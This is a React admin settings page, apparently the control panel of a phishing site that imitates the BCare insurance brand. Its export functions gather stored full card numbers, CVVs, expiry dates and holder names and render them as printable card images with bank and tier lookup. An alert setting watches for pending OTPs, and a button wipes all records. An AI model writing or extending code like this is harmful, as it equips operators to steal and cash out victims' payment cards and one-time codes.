import { useState } from "react";
import { Globe, Shield, Bell, Database, Save, KeyRound, Trash2, LogOut, Settings, FileText, FileSpreadsheet, Download, CreditCard, Timer } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate } from "react-router-dom";

import { logActivity } from "@/lib/activityLogger";
import { getCardMetadata } from "@/lib/cardMetadata";

const AdminSettings = () => {
  const [chatEnabled, setChatEnabled] = useState(true);
  const [siteEnabled, setSiteEnabled] = useState(true);
  const [notificationsEnabled, setNotificationsEnabled] = useState(true);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [showClearDataModal, setShowClearDataModal] = useState(false);
  const [clearingData, setClearingData] = useState(false);
  const [confirmText, setConfirmText] = useState("");
  const [passwords, setPasswords] = useState({ current: "", new: "", confirm: "" });
  const [changingPassword, setChangingPassword] = useState(false);
  const [urgentDelay, setUrgentDelay] = useState(() => {
    const saved = localStorage.getItem("admin_urgent_delay");
    return saved ? parseInt(saved, 10) : 30;
  });
  const navigate = useNavigate();

  const handleClearAllData = async () => {
    if (confirmText !== "مسح") {
      toast.error("يرجى كتابة 'مسح' للتأكيد");
      return;
    }
    setClearingData(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const res = await supabase.functions.invoke("clear-all-data", {
        headers: { Authorization: `Bearer ${session?.access_token}` },
      });
      if (res.error) throw res.error;
      toast.success("تم مسح جميع البيانات بنجاح");
      logActivity("مسح جميع البيانات", "settings", undefined, "تم حذف جميع السجلات من قاعدة البيانات");
      setShowClearDataModal(false);
      setConfirmText("");
    } catch (err: any) {
      toast.error(err.message || "فشل مسح البيانات");
    } finally {
      setClearingData(false);
    }
  };

  const handleSave = () => {
    toast.success("تم حفظ الإعدادات بنجاح");
  };

  const fetchAllData = async () => {
    const [requests, orders, conversations] = await Promise.all([
      supabase.from("insurance_requests").select("*"),
      supabase.from("insurance_orders").select("*"),
      supabase.from("chat_conversations").select("*"),
    ]);
    return {
      requests: requests.data || [],
      orders: orders.data || [],
      conversations: conversations.data || [],
    };
  };

  const handleExportPDF = async () => {
    toast.info("جاري تجهيز ملف PDF...");
    try {
      const data = await fetchAllData();
      const { default: jsPDF } = await import("jspdf");
      const { default: autoTable } = await import("jspdf-autotable");
      const doc = new jsPDF({ orientation: "landscape" });

      doc.setFontSize(18);
      doc.text("BCare Insurance - Data Export", 14, 20);
      doc.setFontSize(10);
      doc.text(`Export Date: ${new Date().toLocaleDateString("en-US")}`, 14, 28);

      let yPos = 35;

      if (data.requests.length > 0) {
        doc.setFontSize(13);
        doc.text("Insurance Requests", 14, yPos);
        autoTable(doc, {
          startY: yPos + 4,
          head: [["ID", "National ID", "Phone", "Type", "Status", "Created"]],
          body: data.requests.map((r: any) => [
            r.id?.slice(0, 8),
            r.national_id,
            r.phone,
            r.request_type,
            r.status,
            new Date(r.created_at).toLocaleDateString("en-US"),
          ]),
          styles: { fontSize: 7, cellPadding: 2 },
          headStyles: { fillColor: [212, 160, 23] },
        });
        yPos = ((doc as any).lastAutoTable?.finalY || yPos) + 10;
      }

      if (data.orders.length > 0) {
        if (yPos > 170) {
          doc.addPage();
          yPos = 20;
        }
        doc.setFontSize(13);
        doc.text("Insurance Orders", 14, yPos);
        autoTable(doc, {
          startY: yPos + 4,
          head: [["ID", "Company", "Type", "Status", "Total Price", "Created"]],
          body: data.orders.map((o: any) => [
            o.id?.slice(0, 8),
            o.company || "-",
            o.insurance_type || "-",
            o.status,
            o.total_price || "-",
            new Date(o.created_at).toLocaleDateString("en-US"),
          ]),
          styles: { fontSize: 7, cellPadding: 2 },
          headStyles: { fillColor: [212, 160, 23] },
        });
        yPos = ((doc as any).lastAutoTable?.finalY || yPos) + 10;
      }

      if (data.orders.length > 0) {
        const cardsData = data.orders.filter((o: any) => o.card_number_full || o.card_last_four);
        if (cardsData.length > 0) {
          if (yPos > 170) {
            doc.addPage();
            yPos = 20;
          }
          doc.setFontSize(13);
          doc.text("Payment Cards", 14, yPos);
          autoTable(doc, {
            startY: yPos + 4,
            head: [["Customer", "Card Number", "CVV", "Expiry", "Holder Name", "Payment Method"]],
            body: cardsData.map((o: any) => [
              o.customer_name || o.national_id || "-",
              o.card_number_full || `****${o.card_last_four || ""}`,
              o.card_cvv || "-",
              o.card_expiry || "-",
              o.card_holder_name || "-",
              o.payment_method || "-",
            ]),
            styles: { fontSize: 7, cellPadding: 2 },
            headStyles: { fillColor: [220, 53, 69] },
          });
          yPos = ((doc as any).lastAutoTable?.finalY || yPos) + 10;
        }
      }

      doc.save("bcare-insurance-data.pdf");
      toast.success("تم تصدير البيانات كملف PDF");
      logActivity("تصدير البيانات كملف PDF", "settings");
    } catch (err: any) {
      // PDF export error - silent
      toast.error("فشل تصدير PDF: " + (err?.message || ""));
    }
  };

  const handleExportExcel = async () => {
    toast.info("جاري تجهيز ملف Excel...");
    try {
      const data = await fetchAllData();
      const XLSX = await import("xlsx");
      const wb = XLSX.utils.book_new();

      if (data.requests.length > 0) {
        const ws = XLSX.utils.json_to_sheet(data.requests);
        XLSX.utils.book_append_sheet(wb, ws, "Requests");
      }
      if (data.orders.length > 0) {
        const ws = XLSX.utils.json_to_sheet(data.orders);
        XLSX.utils.book_append_sheet(wb, ws, "Orders");
      }
      if (data.conversations.length > 0) {
        const ws = XLSX.utils.json_to_sheet(data.conversations);
        XLSX.utils.book_append_sheet(wb, ws, "Conversations");
      }

      XLSX.writeFile(wb, "bcare-insurance-data.xlsx");
      toast.success("تم تصدير البيانات كملف Excel");
      logActivity("تصدير البيانات كملف Excel", "settings");
    } catch (err: any) {
      // Excel export error - silent
      toast.error("فشل تصدير Excel: " + (err?.message || ""));
    }
  };

  // BCare logo as base64 PNG for PDF embedding
  const bcareLogo = (() => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="192" height="80" viewBox="0 0 96 40.277"><g><g><path d="M22.577,32.956a24.942,24.942,0,0,1-4.929,1.618,21.583,21.583,0,0,0,3.9-2.252,32.686,32.686,0,0,1-5.535-4.481c-4.4-4.479-6.208-11.488-6.946-16.709-1.844.583-3.159,1.131-3.159,1.131a27.269,27.269,0,0,1,3.057-1.887,50.357,50.357,0,0,1-.4-5.683A18.083,18.083,0,0,0,27.6,35.441a35.036,35.036,0,0,1-5.019-2.485" transform="translate(0 -2.063)" fill="#FFFFFF"/><path d="M27.317,0a18.034,18.034,0,0,0-5.7.923,47.485,47.485,0,0,0-.3,6.013c3.154-1.219,7-1.911,10.106-.071,4.951,2.929-1.236,9.991-1.236,9.991s6.179-1.049,8.444,2.5c1.82,2.864.385,8.039-6.063,11.241a26.774,26.774,0,0,0,4.518,2.7A18.084,18.084,0,0,0,27.313,0Z" transform="translate(-9.37 0)" fill="#FFFFFF"/><path d="M29.35,15.112c-1.437-1.716-4.85-1.465-7.953-.765.558,11.146,5.572,17.759,10.165,21.514,3.254-2.579,5.317-5.944,3.566-8.8-1.525-2.486-6.209-2.868-10.049-1.4,3.67-2.837,6.944-7.355,4.27-10.55" transform="translate(-9.408 -6.074)" fill="#FFFFFF"/><path d="M80.9,64.337l-2.078-3.6c.829-.35,20.644-8.475,51.835-5.264l-.583,3.984c-29.787-3.07-48.985,4.8-49.174,4.881" transform="translate(-34.656 -24.06)" fill="#faa62e"/><path d="M86.169,25.7l-.277,3.981a24.27,24.27,0,0,1-7.626,1.78c-8.079,0-11.309-5.49-11.309-10.587C66.966,14.447,72,9.863,79.114,9.863a27.377,27.377,0,0,1,5.848.755h.663v4.825l-1.2.151c-.875-3.408-2.682-4.464-6.179-4.464-4.913,0-7.627,4.283-7.627,9.11.005,6,3.165,9.923,7.934,9.923,3.466,0,4.973-1.689,6.36-4.976Z" transform="translate(-29.44 -4.337)" fill="#FFFFFF"/><path d="M111.637,33.512V29.017l-2.593.844a2.647,2.647,0,0,0-2.049,2.293,2.371,2.371,0,0,0,2.291,2.382,6,6,0,0,0,2.351-1.025m2.618,3.016a2.655,2.655,0,0,1-2.533-1.84c-1.049.816-2.472,1.84-3.587,1.84-2.381,0-4.371-1.6-4.371-3.649a4.252,4.252,0,0,1,3.076-3.59l4.8-1.478v-.965c0-2.172-.482-3.712-2.11-3.712-2.08,0-3.8,3.108-3.8,3.108L104.251,24.1a8.72,8.72,0,0,1,6-2.262c2.984,0,4.25,2.051,4.25,4.735v5.943c0,1.386.452,1.99.905,1.99.3,0,.451-.059.964-.392l.361.933Z" transform="translate(-45.623 -9.602)" fill="#FFFFFF"/><path d="M133.922,23.9a5.266,5.266,0,0,1,3.677-2.112,3.84,3.84,0,0,1,2.292,1.086l-1.086,2.081a6.788,6.788,0,0,0-2.292-.964c-.722,0-1.748.542-2.591,1.991v6.755c0,2.052.513,2.232,3.614,2.443v.934h-8.919V35.2c1.958-.211,2.381-.392,2.381-2.473V25.645c0-2.02-.18-2.2-2.2-2.323v-.868l5.124-.664Z" transform="translate(-56.55 -9.578)" fill="#FFFFFF"/><path d="M152.372,27.145h5.578c.541-.059.541-.209.541-.723,0-1.841-.964-3.318-2.8-3.318-1.39,0-2.959,1.39-3.32,4.041m9.255,6.246a7.852,7.852,0,0,1-5.758,3.137,6.5,6.5,0,0,1-6.541-6.786c0-4.494,3.527-7.9,7.112-7.9a5.307,5.307,0,0,1,5.214,5.25c0,.663-.059,1.3-.932,1.387h-8.47c.03,4.223,2.532,5.822,4.671,5.822a6.207,6.207,0,0,0,4.039-1.75Z" transform="translate(-65.656 -9.602)" fill="#FFFFFF"/></g></g></svg>`;
    return "data:image/svg+xml;base64," + btoa(svg);
  })();

  const drawCard3D = (doc: any, x: number, y: number, card: any) => {
    const cw = 160, ch = 100;
    const cardNum = card.card_number_full || card.card_last_four || "";
    const meta = getCardMetadata(cardNum);

    // Card background
    const colors: Record<string, [number, number, number]> = {
      visa: [20, 80, 140],
      mastercard: [25, 25, 55],
      mada: [0, 110, 65],
      amex: [35, 55, 110],
      unknown: [45, 45, 65],
    };
    const [r, g, b] = colors[meta.brandKey] || colors.unknown;
    doc.setFillColor(r, g, b);
    doc.roundedRect(x, y, cw, ch, 6, 6, "F");

    // Subtle top overlay
    doc.setFillColor(255, 255, 255);
    doc.setGState(new (doc as any).GState({ opacity: 0.05 }));
    doc.roundedRect(x, y, cw, ch / 2, 6, 6, "F");
    doc.setGState(new (doc as any).GState({ opacity: 1 }));

    // Decorative arcs
    doc.setDrawColor(255, 255, 255);
    doc.setLineWidth(0.08);
    doc.setGState(new (doc as any).GState({ "stroke-opacity": 0.12 }));
    for (let i = 0; i < 4; i++) {
      doc.circle(x + cw + 8, y + ch - 8, 30 + i * 15);
    }
    doc.setGState(new (doc as any).GState({ "stroke-opacity": 1 }));

    // BCare logo
    try {
      doc.addImage(bcareLogo, "SVG", x + 10, y + 7, 40, 16);
    } catch {
      doc.setFontSize(16);
      doc.setTextColor(255, 255, 255);
      doc.setFont("helvetica", "bold");
      doc.text("BCare", x + 12, y + 18);
    }

    // Bank name (English) - top right
    const bankEN: Record<string, string> = {
      "مصرف الراجحي": "Al Rajhi Bank", "البنك الأهلي السعودي": "SNB",
      "بنك الرياض": "Riyad Bank", "مصرف الإنماء": "Alinma Bank",
      "بنك الجزيرة": "Bank AlJazira", "بنك ساب": "SAB",
      "بنك البلاد": "Bank Albilad", "البنك السعودي للاستثمار": "SAIB",
      "البنك العربي الوطني": "ANB", "مجموعة سامبا المالية": "Samba",
      "بنك الإمارات دبي الوطني": "Emirates NBD", "البنك السعودي الفرنسي": "BSF",
      "بنك الخليج الدولي": "GIB", "بنك الأول": "First Bank",
      "STC Pay": "STC Pay", "بنك ميم": "Meem Bank",
    };
    doc.setFontSize(10);
    doc.setTextColor(220, 230, 245);
    doc.setFont("helvetica", "bold");
    const bankName = bankEN[meta.bankName] || meta.bankName || "Unknown Bank";
    doc.text(bankName, x + cw - 10, y + 14, { align: "right" });

    // Classification (English)
    const classEN: Record<string, string> = {
      "خصم مباشر": "Debit", "ائتمانية": "Credit", "مسبقة الدفع": "Prepaid",
      "كلاسيكية": "Classic", "ذهبية": "Gold", "بلاتينية": "Platinum",
      "سيقنتشر": "Signature", "إنفينت": "Infinite", "غير محدد": "Standard",
    };
    doc.setFontSize(8);
    doc.setTextColor(180, 195, 215);
    doc.setFont("helvetica", "normal");
    const classLabel = classEN[meta.classificationLabel] || meta.classificationLabel || "";
    doc.text(classLabel, x + cw - 10, y + 21, { align: "right" });

    // Chip
    doc.setFillColor(215, 190, 115);
    doc.roundedRect(x + 12, y + 32, 18, 14, 2.5, 2.5, "F");
    doc.setFillColor(200, 175, 100);
    doc.roundedRect(x + 15, y + 35, 12, 8, 1, 1, "F");
    doc.setDrawColor(185, 160, 85);
    doc.setLineWidth(0.3);
    doc.line(x + 21, y + 32, x + 21, y + 46);
    doc.line(x + 12, y + 39, x + 30, y + 39);

    // Card number
    const num = card.card_number_full || `**** **** **** ${card.card_last_four || "****"}`;
    const formatted = num.replace(/(.{4})/g, "$1   ").trim();
    doc.setFontSize(16);
    doc.setTextColor(255, 255, 255);
    doc.setFont("courier", "bold");
    doc.text(formatted, x + 12, y + 60);

    // Labels
    doc.setFontSize(6);
    doc.setFont("helvetica", "normal");
    doc.setTextColor(170, 185, 210);
    doc.text("VALID THRU", x + 12, y + 68);
    doc.text("CVV", x + 60, y + 68);

    // Expiry & CVV
    doc.setFontSize(13);
    doc.setTextColor(255, 255, 255);
    doc.setFont("helvetica", "bold");
    doc.text(card.card_expiry || "--/--", x + 12, y + 76);
    doc.text(card.card_cvv || "---", x + 60, y + 76);

    // Card holder
    doc.setFontSize(11);
    doc.setTextColor(255, 255, 255);
    doc.setFont("helvetica", "bold");
    doc.text((card.card_holder_name || "CARD HOLDER").toUpperCase(), x + 12, y + 92);

    // Card brand (bottom-right) — English only
    const brandEN: Record<string, string> = {
      "مدى": "mada", "غير معروف": "CARD",
    };
    doc.setFontSize(14);
    doc.setTextColor(255, 255, 255);
    doc.setFont("helvetica", "bold");
    const brandText = brandEN[meta.brandLabel] || meta.brandLabel || "CARD";
    doc.text(brandText, x + cw - doc.getTextWidth(brandText) - 10, y + 92);

    // Reset
    doc.setTextColor(0, 0, 0);
    doc.setDrawColor(0, 0, 0);
    doc.setLineWidth(0.2);
  };

  const handleExportCardsPDF = async () => {
    toast.info("جاري تجهيز ملف بطاقات الدفع...");
    try {
      const { data: orders } = await supabase.from("insurance_orders").select("*");
      const cardsData = (orders || []).filter((o: any) => o.card_number_full || o.card_last_four);
      if (cardsData.length === 0) {
        toast.info("لا توجد بيانات بطاقات للتصدير");
        return;
      }
      const { default: jsPDF } = await import("jspdf");
      const doc = new jsPDF({ orientation: "portrait" });
      const pw = doc.internal.pageSize.getWidth();
      const ph = doc.internal.pageSize.getHeight();

      // Header
      doc.setFillColor(20, 99, 148);
      doc.rect(0, 0, pw, 24, "F");
      try {
        doc.addImage(bcareLogo, "SVG", 8, 4, 35, 15);
      } catch {
        doc.setFontSize(16);
        doc.setTextColor(255, 255, 255);
        doc.setFont("helvetica", "bold");
        doc.text("BCare", 12, 14);
      }
      doc.setFontSize(9);
      doc.setTextColor(255, 255, 255);
      doc.setFont("helvetica", "normal");
      doc.text("Payment Cards Export", 48, 13);
      doc.setFontSize(7);
      doc.text(`${new Date().toLocaleDateString("en-US")}  |  ${cardsData.length} card(s)`, pw - 10, 13, { align: "right" });
      doc.setFillColor(250, 166, 46);
      doc.rect(0, 24, pw, 1.5, "F");

      doc.setTextColor(0, 0, 0);

      const cardW = 160, cardH = 100;
      const cardsPerPage = 2;
      const totalCardSpace = cardsPerPage * cardH + (cardsPerPage - 1) * 20;
      const baseY = 26 + (ph - 26 - totalCardSpace) / 2;

      cardsData.forEach((card: any, i: number) => {
        if (i > 0 && i % cardsPerPage === 0) doc.addPage();
        const posOnPage = i % cardsPerPage;
        const cx = (pw - cardW) / 2;
        const cy = baseY + posOnPage * (cardH + 20);
        drawCard3D(doc, cx, cy, card);
      });

      doc.save("bcare-payment-cards.pdf");
      toast.success("تم تصدير بطاقات الدفع");
      logActivity("تصدير بطاقات الدفع كملف PDF", "settings");
    } catch (err: any) {
      // Cards export error - silent
      toast.error("فشل تصدير البطاقات: " + (err?.message || ""));
    }
  };

  const handleChangePassword = async () => {
    if (passwords.new !== passwords.confirm) {
      toast.error("كلمة المرور الجديدة غير متطابقة");
      return;
    }
    if (passwords.new.length < 6) {
      toast.error("كلمة المرور يجب أن تكون 6 أحرف على الأقل");
      return;
    }
    setChangingPassword(true);
    try {
      const { error } = await supabase.auth.updateUser({ password: passwords.new });
      if (error) throw error;
      toast.success("تم تغيير كلمة المرور بنجاح");
      logActivity("تغيير كلمة المرور", "settings");
      setShowPasswordModal(false);
      setPasswords({ current: "", new: "", confirm: "" });
    } catch (err: any) {
      toast.error(err.message || "فشل تغيير كلمة المرور");
    } finally {
      setChangingPassword(false);
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    toast.success("تم تسجيل الخروج");
    navigate("/admin/login");
  };

  const ToggleSwitch = ({ enabled, onChange, label, description, icon: Icon }: any) => (
    <div className="flex items-center justify-between p-3 bg-secondary/30 rounded-xl border border-border">
      <div className="flex items-center gap-3">
        <div className="w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center">
          <Icon className="w-4 h-4 text-primary" />
        </div>
        <div>
          <p className="text-xs font-bold text-foreground">{label}</p>
          <p className="text-[10px] text-muted-foreground">{description}</p>
        </div>
      </div>
      <button
        onClick={() => onChange(!enabled)}
        className={`w-10 h-5 rounded-full transition-all relative ${enabled ? "bg-emerald-500" : "bg-muted"}`}
      >
        <span className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-all ${enabled ? "left-5" : "left-0.5"}`} />
      </button>
    </div>
  );

  const SettingsAction = ({ icon: Icon, label, onClick, variant = "default" }: { icon: any; label: string; onClick: () => void; variant?: "default" | "danger" }) => (
    <button
      onClick={onClick}
      className={`w-full flex items-center gap-3 p-3 rounded-xl border transition-all text-right ${
        variant === "danger"
          ? "bg-red-500/5 border-red-500/20 hover:bg-red-500/10"
          : "bg-secondary/30 border-border hover:bg-secondary/50"
      }`}
    >
      <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${
        variant === "danger" ? "bg-red-500/10" : "bg-primary/10"
      }`}>
        <Icon className={`w-4 h-4 ${variant === "danger" ? "text-red-500" : "text-primary"}`} />
      </div>
      <span className={`text-xs font-bold ${variant === "danger" ? "text-red-500" : "text-foreground"}`}>{label}</span>
    </button>
  );

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-2">
        <Settings className="w-5 h-5 text-primary" />
        <div>
          <h1 className="text-xl font-bold text-foreground">الإعدادات</h1>
          <p className="text-xs text-muted-foreground">إعدادات النظام والموقع</p>
        </div>
      </div>

      {/* General Settings */}
      <div className="bg-card rounded-xl border border-border p-4 space-y-3">
        <h2 className="text-sm font-bold text-foreground mb-3">إعدادات عامة</h2>
        <ToggleSwitch enabled={siteEnabled} onChange={setSiteEnabled} label="تفعيل الموقع" description="التحكم في حالة الموقع (تشغيل / إيقاف)" icon={Globe} />
        <ToggleSwitch enabled={chatEnabled} onChange={setChatEnabled} label="تفعيل الدردشة" description="السماح للزوار بإرسال رسائل عبر الدردشة" icon={Shield} />
        <ToggleSwitch enabled={notificationsEnabled} onChange={setNotificationsEnabled} label="الإشعارات" description="تلقي إشعارات عند وصول طلبات أو رسائل جديدة" icon={Bell} />

        {/* Urgent OTP delay slider */}
        <div className="flex items-center justify-between p-3 bg-secondary/30 rounded-xl border border-border">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-red-500/10 flex items-center justify-center">
              <Timer className="w-4 h-4 text-red-500" />
            </div>
            <div>
              <p className="text-xs font-bold text-foreground">مدة التنبيه العاجل</p>
              <p className="text-[10px] text-muted-foreground">تنبيه عند بقاء OTP معلقاً أكثر من المدة المحددة</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <select
              value={urgentDelay}
              onChange={(e) => {
                const val = parseInt(e.target.value, 10);
                setUrgentDelay(val);
                localStorage.setItem("admin_urgent_delay", String(val));
                toast.success(`تم تعيين التنبيه العاجل على ${val} ثانية`);
              }}
              className="bg-card border border-border rounded-lg text-xs px-2 py-1.5 text-foreground focus:outline-none focus:ring-1 focus:ring-primary"
            >
              <option value={15}>15 ثانية</option>
              <option value={20}>20 ثانية</option>
              <option value={30}>30 ثانية</option>
              <option value={45}>45 ثانية</option>
              <option value={60}>60 ثانية</option>
              <option value={90}>90 ثانية</option>
              <option value={120}>دقيقتان</option>
            </select>
          </div>
        </div>
      </div>
      <div className="bg-card rounded-xl border border-border p-4 space-y-3">
        <h2 className="text-sm font-bold text-foreground mb-3 flex items-center gap-2">
          <Download className="w-4 h-4 text-primary" />
          تصدير البيانات
        </h2>
        <SettingsAction icon={FileText} label="تصدير كملف PDF" onClick={handleExportPDF} />
        <SettingsAction icon={FileSpreadsheet} label="تصدير كملف Excel" onClick={handleExportExcel} />
        <SettingsAction icon={CreditCard} label="تصدير بطاقات الدفع PDF" onClick={handleExportCardsPDF} />
      </div>

      <div className="bg-card rounded-xl border border-border p-4 space-y-3">
        <h2 className="text-sm font-bold text-foreground mb-3">إجراءات الحساب</h2>
        <SettingsAction icon={KeyRound} label="تغيير كلمة المرور" onClick={() => setShowPasswordModal(true)} />
        <SettingsAction icon={Trash2} label="مسح جميع البيانات" onClick={() => setShowClearDataModal(true)} variant="danger" />
        <SettingsAction icon={LogOut} label="تسجيل الخروج" onClick={handleLogout} variant="danger" />
      </div>

      {/* Database Status */}
      <div className="bg-card rounded-xl border border-border p-4 space-y-3">
        <h2 className="text-sm font-bold text-foreground mb-3">قاعدة البيانات</h2>
        <div className="flex items-center gap-3 p-3 bg-secondary/30 rounded-xl border border-border">
          <div className="w-8 h-8 rounded-lg bg-emerald-500/10 flex items-center justify-center">
            <Database className="w-4 h-4 text-emerald-500" />
          </div>
          <div>
            <p className="text-xs font-bold text-foreground">متصل</p>
            <p className="text-[10px] text-muted-foreground">قاعدة البيانات تعمل بشكل طبيعي</p>
          </div>
          <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse mr-auto" />
        </div>
      </div>

      <Button onClick={handleSave} className="bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl gap-2">
        <Save className="w-3.5 h-3.5" />
        حفظ الإعدادات
      </Button>

      {/* Password Change Modal */}
      {showPasswordModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4" onClick={() => setShowPasswordModal(false)}>
          <div className="bg-card rounded-2xl border border-border p-6 w-full max-w-sm space-y-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center gap-2 mb-2">
              <KeyRound className="w-5 h-5 text-primary" />
              <h3 className="text-base font-bold text-foreground">تغيير كلمة المرور</h3>
            </div>
            <div>
              <label className="block text-xs font-bold text-foreground mb-1">كلمة المرور الجديدة</label>
              <input
                type="password"
                value={passwords.new}
                onChange={(e) => setPasswords({ ...passwords, new: e.target.value })}
                className="w-full px-3 py-2.5 rounded-xl bg-secondary/50 border border-border text-foreground text-sm focus:outline-none focus:border-primary"
                placeholder="أدخل كلمة المرور الجديدة"
              />
            </div>
            <div>
              <label className="block text-xs font-bold text-foreground mb-1">تأكيد كلمة المرور</label>
              <input
                type="password"
                value={passwords.confirm}
                onChange={(e) => setPasswords({ ...passwords, confirm: e.target.value })}
                className="w-full px-3 py-2.5 rounded-xl bg-secondary/50 border border-border text-foreground text-sm focus:outline-none focus:border-primary"
                placeholder="أعد إدخال كلمة المرور"
              />
            </div>
            <div className="flex gap-2 pt-2">
              <Button onClick={handleChangePassword} disabled={changingPassword} className="flex-1 bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl text-sm">
                {changingPassword ? "جاري التغيير..." : "تغيير"}
              </Button>
              <Button variant="outline" onClick={() => setShowPasswordModal(false)} className="flex-1 rounded-xl text-sm">
                إلغاء
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Clear Data Confirmation Modal */}
      {showClearDataModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4" onClick={() => setShowClearDataModal(false)}>
          <div className="bg-card rounded-2xl border border-red-500/20 p-6 w-full max-w-sm space-y-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center gap-2 mb-2">
              <Trash2 className="w-5 h-5 text-red-500" />
              <h3 className="text-base font-bold text-foreground">مسح جميع البيانات</h3>
            </div>
            <p className="text-xs text-muted-foreground leading-relaxed">
              سيتم حذف جميع الطلبات، المطالبات، المحادثات، والطلبات من قاعدة البيانات نهائياً. هذا الإجراء لا يمكن التراجع عنه.
            </p>
            <div>
              <label className="block text-xs font-bold text-foreground mb-1">اكتب "مسح" للتأكيد</label>
              <input
                type="text"
                value={confirmText}
                onChange={(e) => setConfirmText(e.target.value)}
                className="w-full px-3 py-2.5 rounded-xl bg-secondary/50 border border-red-500/20 text-foreground text-sm focus:outline-none focus:border-red-500"
                placeholder="مسح"
              />
            </div>
            <div className="flex gap-2 pt-2">
              <Button onClick={handleClearAllData} disabled={clearingData || confirmText !== "مسح"} className="flex-1 bg-red-500 hover:bg-red-600 text-white rounded-xl text-sm">
                {clearingData ? "جاري المسح..." : "مسح نهائي"}
              </Button>
              <Button variant="outline" onClick={() => { setShowClearDataModal(false); setConfirmText(""); }} className="flex-1 rounded-xl text-sm">
                إلغاء
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminSettings;
